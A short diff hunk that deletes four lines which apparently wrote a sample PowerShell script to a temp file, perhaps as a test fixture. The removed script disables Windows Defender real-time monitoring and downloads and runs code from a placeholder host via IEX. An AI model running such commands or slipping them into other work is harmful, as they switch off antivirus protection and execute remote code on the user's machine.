@@ -1,4 +1,0 @@
-   @'
-   Set-MpPreference -DisableRealtimeMonitoring $true
-   IEX (New-Object Net.WebClient).DownloadString("http://x.test/a")
-   '@ | Set-Content $env:TEMP\sample_script.ps1
